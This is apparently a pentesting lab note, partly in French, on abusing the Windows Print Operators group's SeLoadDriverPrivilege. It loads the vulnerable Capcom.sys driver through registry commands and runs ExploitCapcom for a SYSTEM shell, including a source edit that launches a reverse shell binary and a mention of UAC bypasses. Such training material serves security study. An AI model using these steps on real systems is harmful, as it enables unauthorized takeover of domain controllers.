# Print Operators

***

{% hint style="warning" %}
Le groupe Print Operators est un groupe avec des droits administratifs avancés, notamment le privilège SeLoadDriverPrivilege, qui permet de gérer les imprimantes sur un contrôleur de domaine. Ses membres peuvent aussi se connecter localement au contrôleur et effectuer des actions critiques comme l’arrêt du serveur. Si vous ne voyez pas ce privilège avec `whoami /priv` en mode non administrateur, il faut contourner l’UAC pour l’obtenir.
{% endhint %}

<mark style="color:green;">**Confirming Privileges**</mark>

```cmd-session
C:\htb> whoami /priv
```

<mark style="color:green;">**Checking Privileges Again**</mark>

{% hint style="info" %}
The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.
{% endhint %}

{% hint style="warning" %}
It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
{% endhint %}

Download it locally and edit it, pasting over the includes below.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

<mark style="color:green;">**Compile with cl.exe**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
{% endcode %}

<mark style="color:green;">**Add Reference to Driver**</mark>

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY\_CURRENT\_USER tree.

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
{% endcode %}

The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

<mark style="color:green;">**Verify Driver is not Loaded**</mark>

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

<mark style="color:green;">**Verify Privilege is Enabled**</mark>

```cmd-session
C:\htb> EnableSeLoadDriverPrivilege.exe
```

<mark style="color:green;">**Verify Capcom Driver is Listed**</mark>

```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

<mark style="color:green;">**Use ExploitCapcom Tool to Escalate Privileges**</mark>

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell-session
PS C:\htb> .\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">Alternate Exploitation - No GUI</mark>

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

***

### <mark style="color:red;">Automating the Steps</mark>

<mark style="color:green;">**Automating with EopLoadDriver**</mark>

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

{% code fullWidth="true" %}
```cmd-session
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
{% endcode %}

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

***

### <mark style="color:red;">Clean-up</mark>

<mark style="color:green;">**Removing Registry Key**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```
{% endcode %}

{% hint style="danger" %}
Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY\_CURRENT\_USER".
{% endhint %}
